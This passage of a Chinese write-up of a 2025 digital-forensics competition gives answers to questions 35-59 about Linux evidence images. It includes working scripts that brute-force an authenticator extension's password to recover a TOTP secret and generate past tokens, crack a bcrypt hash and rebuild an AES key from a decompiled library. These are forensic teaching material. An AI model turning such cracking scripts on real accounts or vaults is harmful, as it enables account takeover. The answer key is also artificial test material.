class="string">&quot;U2FsdGVkX1+eacsEnU0gCAZ1MQR8aoQKWZIH8oRlWkkdnsm0SrMfmXK98hBGaAqr&quot;</span><span class="punctuation">,</span>  <span class="comment">// 加密的TOTP密钥</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;totp&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">chenhaoren</span><br></pre></td></tr></table></figure>

<p>36.(填空)请分析检材2Linux系统，该检材Linux系统浏览器插件存放的令牌在2022-05-12 00:54:10时的令牌为 (参考格式:123456) 分值:29</p>
<p>先解密TOTP的秘钥</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> masterKeyHex = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encryptedMasterKey, password).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>);</span><br><span class="line"><span class="keyword">const</span> totpSecret = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encryptedTotpSecret, masterKeyHex).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TOTP密钥:&quot;</span>, totpSecret);</span><br></pre></td></tr></table></figure>

<p>然后通过覆盖<code>Data.now()</code>​模拟历史时间</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> originalDateNow = <span class="title class_">Date</span>.<span class="property">now</span>;</span><br><span class="line"><span class="title class_">Date</span>.<span class="property">now</span> = <span class="function">() =&gt;</span> timestamp * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">const</span> token = authenticator.<span class="title function_">generate</span>(totpSecret);</span><br><span class="line"><span class="title class_">Date</span>.<span class="property">now</span> = originalDateNow;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`token: <span class="subst">$&#123;token&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>

<p>注意先<code>npm install crypto-js otplib</code>​</p>
<blockquote>
<p>34-36题脚本解题</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&quot;crypto-js&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> argon2 = <span class="built_in">require</span>(<span class="string">&quot;argon2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; authenticator &#125; = <span class="built_in">require</span>(<span class="string">&quot;otplib&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 数据 ==========</span></span><br><span class="line"><span class="keyword">const</span> encryptedMasterKey = <span class="string">&quot;U2FsdGVkX18Tb9IA8UF4TbpMQjOs4IqZBTIkldDlgn9vw1gIF9ltOirI/lf1SCGh9hAskbnb7cIsoJL6mNii7pQ1SDSt9R7vzF3Y+/d/fPtKXHMisjbQK/U6t+3wREAuoKQ4yZ24iuw+KZ6CW9bl6ULp3nVx0B8QpueW95sw0KOtmOMpmD19nO6gkFvMohcB&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> argon2Hash = <span class="string">&quot;$argon2id$v=19$m=16384,t=1,p=1$k6EZEDdQYyn+/0GlJtZGpg$hicAuwJorE73Moj+Po2Txda8hyoPPGYa&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> encryptedTotpSecret = <span class="string">&quot;U2FsdGVkX1+eacsEnU0gCAZ1MQR8aoQKWZIH8oRlWkkdnsm0SrMfmXK98hBGaAqr&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> targetTime = <span class="string">&quot;2022-05-12 00:54:10&quot;</span>;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="comment">// ====== 1 ====== 爆破密码 ======</span></span><br><span class="line">  <span class="keyword">let</span> password = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> pwd = <span class="string">&quot;chewhaoN@&quot;</span> + <span class="title class_">String</span>(i).<span class="title function_">padStart</span>(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> decrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encryptedMasterKey, pwd);</span><br><span class="line">      <span class="keyword">const</span> hex = decrypted.<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>);</span><br><span class="line">      <span class="keyword">if</span> (hex &amp;&amp; <span class="keyword">await</span> argon2.<span class="title function_">verify</span>(argon2Hash, hex)) &#123;</span><br><span class="line">        password = pwd;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;密码:&quot;</span>, password);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!password) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ===== 2 ===== 解密TOTP秘钥 ======</span></span><br><span class="line">  <span class="keyword">const</span> masterKeyHex = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encryptedMasterKey, password).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>);</span><br><span class="line">  <span class="keyword">const</span> totpSecret = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encryptedTotpSecret, masterKeyHex).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TOTP密钥:&quot;</span>, totpSecret);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n步骤3: 计算历史令牌...&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> timestamp = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(targetTime).<span class="title function_">getTime</span>() / <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 模拟历史时间</span></span><br><span class="line">  <span class="keyword">const</span> originalDateNow = <span class="title class_">Date</span>.<span class="property">now</span>;</span><br><span class="line">  <span class="title class_">Date</span>.<span class="property">now</span> = <span class="function">() =&gt;</span> timestamp * <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">const</span> token = authenticator.<span class="title function_">generate</span>(totpSecret);</span><br><span class="line">  <span class="title class_">Date</span>.<span class="property">now</span> = originalDateNow;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`token: <span class="subst">$&#123;token&#125;</span>`</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080000</span><br></pre></td></tr></table></figure>

<p>37.(填空)请分析检材3，该操作系统版本号为 (参考格式:22.01.1) 分值:16</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015172535-6ujqjcq.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">24.04.1</span><br></pre></td></tr></table></figure>

<p>38.(填空)请分析检材3，该主机名为 (参考格式:app-server-2025) 分值:16</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015172626-2elmmjp.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api-server-2</span><br></pre></td></tr></table></figure>

<p>39.(填空)请分析检材3，该ens33网卡IP地址为 (参考格式:192.168.1.1) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015172847-l1uiqiz.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.16.10.254</span><br></pre></td></tr></table></figure>

<p>40.(单选)请分析检材3，操作系统登录使用了第三方身份验证，该技术为 分值:19<br>A.pam_pwdfile<br>B.pam_ldap<br>C.Google Auth<br>D.pam_krb5</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015173157-5z5yv2j.png" alt="image">​</p>
<p>搜一下，<code>/etc</code>​目录里面的这个是</p>
<p>41.(单选)请分析检材3，该身份验证的加密算法为？ 分值:23<br>A.Bcrypt<br>B.MD5<br>C.DES<br>D.AES</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015174956-g8birz4.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure>

<p>42.(填空)请分析检材3，该保存king用户密码的文件名为？ (参考格式:shadow) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015184846-yrml4na.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_two_factor_pwdfile</span><br></pre></td></tr></table></figure>

<p>43.(填空)请分析检材3，尝试爆破king用户，其密码为(king字母加3个数字)？ (参考格式:king123) 分值:23</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bcrypt</span><br><span class="line">hash_str = <span class="string">&quot;$2a$10$V/8GUI5aTNSnbFodPjP7Zu6vCFSXmvdd9oKHGtWv/vbT3Q4LLTCcW&quot;</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    password = <span class="string">f&quot;king<span class="subst">&#123;num:03d&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> bcrypt.checkpw(password.encode(), hash_str.encode()):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密码: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">king110</span><br></pre></td></tr></table></figure>

<p>44.(填空)请分析检材3，该WEB-API配置的 MySQL 数据库服务器地址为 (参考格式:192.168.1.1) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015190054-0xty82c.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">172.16</span><span class="number">.10</span><span class="number">.200</span></span><br></pre></td></tr></table></figure>

<p>45.(填空)请分析检材3，其中用于 WEB-API 测试的流量包文件名为 (参考格式:abc.txt) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015190203-i50amij.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test.pcap</span><br></pre></td></tr></table></figure>

<p>46.(填空)请分析检材3流量包，统计其中 admin 用户成功登录的次数为 (参考格式:1) 分值:23</p>
<p>过滤<code>code == 200</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015191728-28jbr5w.png" alt="image">​</p>
<p>点点发现前三个有<code>登录成功</code>​的返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>47.(填空)请分析检材3流量包，找出用户最后一次查看的商品型号为 (参考格式:kk-123) 分值:23</p>
<p>继续往下翻就有</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015192052-h9scsv3.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hx-101</span><br></pre></td></tr></table></figure>

<p>48.(填空)请分析检材3WEB-API，该容器镜像ID为(前六位) (参考格式:abc123) 分值:19</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015192456-3g953yd.png" alt="image">​</p>
<p>找到三个<code>config.v2.json</code>​</p>
<p>vscode看一下，<code>d4cb</code>​开头的那个文件夹是web_api的docker镜像文件</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015192613-8krohwt.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">996a32</span><br></pre></td></tr></table></figure>

<p>49.(单选)请分析检材3WEB-API，该容器的核心服务编程语言为 分值:19<br>A.JAVA<br>B.PHP<br>C.NODEJS<br>D.C#</p>
<p>启动命令中有<code>exec node index.js</code>​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure>

<p>50.(填空)请分析检材3WEB-API，该容器所用域名为 (参考格式:qq.com) 分值:23</p>
<p>根据前面<code>test.pcap</code>​中的访问IP进行搜索</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015194244-0fek0yn.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api-server.com</span><br></pre></td></tr></table></figure>

<p>51.(填空)请分析检材3WEB-API，该容器日志文件名(access_log)为 (参考格式:abc.txt) 分值:23</p>
<p>有提示<code>access_log</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015195132-22sokiq.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api-server-access.log</span><br></pre></td></tr></table></figure>

<p>52.(填空)请分析检材3WEB-API，该容器的FLAG2的接口URL为 (参考格式:&#x2F;aaa&#x2F;bbb&#x2F;ccc) 分值:23</p>
<p>直接搜<code>flag2</code>​</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015195510-sh40n2f.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/auth/flag2</span><br></pre></td></tr></table></figure>

<p>53.(填空)请分析检材3WEB-API，该容器的服务运行状态的接口URL为 (参考格式:&#x2F;aaa&#x2F;bbb) 分值:23</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015200259-9hwrbmg.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/health</span><br></pre></td></tr></table></figure>

<p>54.(单选)请分析检材3WEB-API，该容器中访问FLAG2接口后，会提示需要在什么调试器下运行 分值:23<br>A.GDB<br>B.Frida<br>C.rr<br>D.Treace</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015201208-q2bedk6.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br></pre></td></tr></table></figure>

<p>55.(填空)请分析检材3WEB-API，该容器的admin用户的登录密码为 (参考格式:abc123) 分值:23</p>
<p>前面pcap已经有了</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015201330-fr61f98.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zhaohong666</span><br></pre></td></tr></table></figure>

<p>56.(填空)请分析检材3WEB-API，该容器的数据库内容被SO所加密，该SO文件名为 (参考格式:abc.txt) 分值:19</p>
<p>直接只在这个文件夹里面搜索</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015201526-x9mjk4q.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libJiami.so</span><br></pre></td></tr></table></figure>

<p>57.(单选)请继续分析上题SO文件，该文件的编译器类型为 分值:19<br>A.VC<br>B.DELPHI<br>C.GCC<br>D.VB</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015201657-j9zgxa2.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure>

<p>58.(单选)请继续分析上题SO文件，在SO文件的encrypt函数中，该加密算法为 分值:23<br>A.DES<br>B.AES-128<br>C.AES-192<br>D.AES-256</p>
<p><img src="/2025/10/17/2025FICfinal/image-20251015201951-yfup7nv.png" alt="image">​</p>
<p>很明显是256</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D </span><br></pre></td></tr></table></figure>

<p>59.(填空)请继续分析上题SO文件，尝试分析getAeskey函数，该KEY值为 (参考格式:abasdcdefghijgasdsdfsdfqwesazada) 分值:29</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">恢复 getAeskey() 函数生成的AES密钥</span></span><br><span class="line"><span class="string">基于完整的C伪代码还原</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_aes_key</span>(<span class="params">xmmword_2050</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据反编译的 getAeskey() 函数逻辑恢复AES密钥</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        xmmword_2050: 16字节的初始值 (bytes)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        (key1, key2): 两个16字节的密钥</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 初始化置换表数据（从 v12-v27）</span></span><br><span class="line">    int64_constant_values = [</span><br><span class="line">        <span class="number">0xF00000002</span>,   <span class="comment"># v12</span></span><br><span class="line">        <span class="number">0x1C00000000</span>,  <span class="comment"># v13</span></span><br><span class="line">        <span class="number">0x900000005</span>,   <span class="comment"># v14</span></span><br><span class="line">        <span class="number">0xC0000001F</span>,   <span class="comment"># v15</span></span><br><span class="line">        <span class="number">0x300000014</span>,   <span class="comment"># v16</span></span><br><span class="line">        <span class="number">0x1000000019</span>,  <span class="comment"># v17</span></span><br><span class="line">        <span class="number">0xE00000008</span>,   <span class="comment"># v18</span></span><br><span class="line">        <span class="number">0x1600000001</span>,  <span class="comment"># v19</span></span><br><span class="line">        <span class="number">0x60000001B</span>,   <span class="comment"># v20</span></span><br><span class="line">        <span class="number">0x120000000D</span>,  <span class="comment"># v21</span></span><br><span class="line">        <span class="number">0x40000001E</span>,   <span class="comment"># v22</span></span><br><span class="line">        <span class="number">0xA00000018</span>,   <span class="comment"># v23</span></span><br><span class="line">        <span class="number">0xB0000001A</span>,   <span class="comment"># v24</span></span><br><span class="line">        <span class="number">0x110000001D</span>,  <span class="comment"># v25</span></span><br><span class="line">        <span class="number">0x1700000015</span>,  <span class="comment"># v26</span></span><br><span class="line">    ]</span><br><span class="line">    v27_val = <span class="number">19</span>  <span class="comment"># v27</span></span><br><span class="line">    <span class="comment"># v11[0..8] 是未初始化的栈变量，假设为0</span></span><br><span class="line">    mem_region_v11_parts = [<span class="number">0</span>] * <span class="number">9</span></span><br><span class="line">    <span class="comment"># 将64位常量拆分为DWORD数组</span></span><br><span class="line">    constants_as_dwords = []</span><br><span class="line">    <span class="keyword">for</span> val64 <span class="keyword">in</span> int64_constant_values:</span><br><span class="line">        constants_as_dwords.append(val64 &amp; <span class="number">0xFFFFFFFF</span>)      <span class="comment"># 低32位</span></span><br><span class="line">        constants_as_dwords.append((val64 &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>)  <span class="comment"># 高32位</span></span><br><span class="line">    constants_as_dwords.append(v27_val &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    <span class="comment"># 构建完整的DWORD视图</span></span><br><span class="line">    full_dword_view = mem_region_v11_parts + constants_as_dwords</span><br><span class="line">    <span class="comment"># v9: 96字节的缓冲区</span></span><br><span class="line">    v9_data = <span class="built_in">bytearray</span>(<span class="number">96</span>)</span><br><span class="line">    <span class="comment"># 初始化 v9[0] 和 v9[1]</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(xmmword_2050, <span class="built_in">bytes</span>) <span class="keyword">or</span> <span class="built_in">len</span>(xmmword_2050) != <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;xmmword_2050 必须是16字节的bytes对象&quot;</span>)</span><br><span class="line">    v9_data[<span class="number">0</span>:<span class="number">16</span>] = xmmword_2050   <span class="comment"># v9[0]</span></span><br><span class="line">    v9_data[<span class="number">16</span>:<span class="number">32</span>] = xmmword_2050  <span class="comment"># v9[1]</span></span><br><span class="line">    <span class="comment"># 第一个循环：填充 v9[2] 和 v9[3] (字节32-63)</span></span><br><span class="line">    v0_current_byte = <span class="number">35</span>  <span class="comment"># 初始值</span></span><br><span class="line">    <span class="keyword">for</span> v1_loop_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v9_data[<span class="number">32</span> + v1_loop_idx] = v0_current_byte &amp; <span class="number">0xFF</span></span><br><span class="line">        v1_after_increment = v1_loop_idx + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v1_after_increment == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        idx_for_v11_access = v1_after_increment + <span class="number">8</span></span><br><span class="line">        v9_lookup_offset = full_dword_view[idx_for_v11_access]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= v9_lookup_offset &lt; <span class="built_in">len</span>(v9_data)):</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">f&quot;v9_lookup_offset <span class="subst">&#123;v9_lookup_offset&#125;</span> 越界&quot;</span>)</span><br><span class="line">        v0_current_byte = v9_data[v9_lookup_offset]</span><br><span class="line">    <span class="comment"># 第二个循环：构建置换数组 v28</span></span><br><span class="line">    v28_py_indices = [-<span class="number">1</span>] * <span class="number">32</span></span><br><span class="line">    v2_counter = <span class="number">0</span></span><br><span class="line">    current_idx_for_v28_array = <span class="number">7</span>  <span class="comment"># 初始值</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= current_idx_for_v28_array &lt; <span class="built_in">len</span>(v28_py_indices)):</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">f&quot;current_idx_for_v28_array <span class="subst">&#123;current_idx_for_v28_array&#125;</span> 越界&quot;</span>)</span><br><span class="line">        v28_py_indices[current_idx_for_v28_array] = v2_counter</span><br><span class="line">        v2_counter += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v2_counter == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        idx_for_v11_access_v28loop = v2_counter + <span class="number">8</span></span><br><span class="line">        current_idx_for_v28_array = full_dword_view[idx_for_v11_access_v28loop]</span><br><span class="line">    <span class="comment"># 第三个循环：根据置换表从 v9[2] 置换到 v9[4]</span></span><br><span class="line">    <span class="keyword">for</span> j_loop_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        permutation_source_offset = v28_py_indices[j_loop_idx]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= permutation_source_offset &lt; <span class="number">32</span>):</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">f&quot;置换源偏移 <span class="subst">&#123;permutation_source_offset&#125;</span> 越界&quot;</span>)</span><br><span class="line">        byte_to_permute = v9_data[<span class="number">32</span> + permutation_source_offset]</span><br><span class="line">        v9_data[<span class="number">64</span> + j_loop_idx] = byte_to_permute</span><br><span class="line">    <span class="comment"># 第四个循环：XOR 0x44 生成 v10</span></span><br><span class="line">    v10_buffer = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> k_loop_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        byte_from_permuted = v9_data[<span class="number">64</span> + k_loop_idx]</span><br><span class="line">        v10_buffer[k_loop_idx] = byte_from_permuted ^ <span class="number">0x44</span></span><br><span class="line">    <span class="comment"># 提取密钥</span></span><br><span class="line">    <span class="comment"># key1 = v10的前16字节</span></span><br><span class="line">    v6_loaded_16_bytes = v10_buffer[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    <span class="comment"># key2 = v11的前16字节 (从full_dword_view[0:4])</span></span><br><span class="line">    v7_loaded_16_bytes_buffer = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):  <span class="comment"># 4个DWORD = 16字节</span></span><br><span class="line">        dword_val = full_dword_view[i]</span><br><span class="line">        <span class="comment"># 小端序打包</span></span><br><span class="line">        v7_loaded_16_bytes_buffer[i*<span class="number">4</span> + <span class="number">0</span>] = (dword_val &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        v7_loaded_16_bytes_buffer[i*<span class="number">4</span> + <span class="number">1</span>] = (dword_val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        v7_loaded_16_bytes_buffer[i*<span class="number">4</span> + <span class="number">2</span>] = (dword_val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        v7_loaded_16_bytes_buffer[i*<span class="number">4</span> + <span class="number">3</span>] = (dword_val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    key1 = <span class="built_in">bytes</span>(v6_loaded_16_bytes)</span><br><span class="line">    key2 = <span class="built_in">bytes</span>(v7_loaded_16_bytes_buffer)</span><br><span class="line">    <span class="keyword">return</span> key1, key2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    xmmword_input = <span class="built_in">input</span>(<span class="string">&quot;xmmword_2050: &quot;</span>).strip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 尝试作为十六进制字符串解析</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(xmmword_input) == <span class="number">32</span> <span class="keyword">and</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> xmmword_input):</span><br><span class="line">            <span class="comment"># IDA显示的是大端序，需要转换为小端序</span></span><br><span class="line">            big_int = <span class="built_in">int</span>(xmmword_input, <span class="number">16</span>)</span><br><span class="line">            xmmword_2050 = big_int.to_bytes(<span class="number">16</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 尝试作为大整数解析（little-endian）</span></span><br><span class="line">            big_int = <span class="built_in">int</span>(xmmword_input)</span><br><span class="line">            xmmword_2050 = big_int.to_bytes(<span class="number">16</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(xmmword_2050) != <span class="number">16</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;错误: 需要16字节，但得到了 <span class="subst">&#123;<span class="built_in">len</span>(xmmword_2050)&#125;</span> 字节&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n使用的 xmmword_2050 (hex): <span class="subst">&#123;xmmword_2050.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ASCII表示: <span class="subst">&#123;xmmword_2050&#125;</span>&quot;</span>)</span><br><span class="line">        key1, key2 = recover_aes_key(xmmword_2050)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;恢复的AES密钥:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密钥1 (aeskey_0):     <span class="subst">&#123;key1.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密钥1 ASCII:          <span class="subst">&#123;key1.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密钥2 (xmmword_4190):  <span class="subst">&#123;key2.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;完整密钥 (32字节):    <span class="subst">&#123;(key1 + key2).<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 输入格式无效 - <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: <span 